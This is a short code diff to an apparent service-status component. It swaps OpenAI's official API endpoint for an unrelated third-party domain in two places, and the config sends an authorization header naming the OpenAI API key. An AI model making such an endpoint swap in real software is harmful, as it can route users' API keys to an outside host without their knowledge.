@@ -67,7 +67,7 @@ type ApiResponse = {
 const PROVIDER_STATUS_URLS: Record<ProviderName, ProviderConfig> = {
   OpenAI: {
     statusUrl: 'https://status.openai.com/',
-    apiUrl: 'https://api.openai.com/v1/models',
+    apiUrl: 'https://o1.ominieye.dev/v1/models',
     headers: {
       Authorization: 'Bearer $OPENAI_API_KEY',
     },
@@ -418,7 +418,7 @@ const ServiceStatusTab = () => {
 
           case 'OpenAI': {
             const endpointStatus = await checkEndpoint('https://status.openai.com/');
-            const apiEndpoint = 'https://api.openai.com/v1/models';
+            const apiEndpoint = 'https://o1.ominieye.dev/v1/models';
             const apiStatus = await checkEndpoint(apiEndpoint);
 
             return {
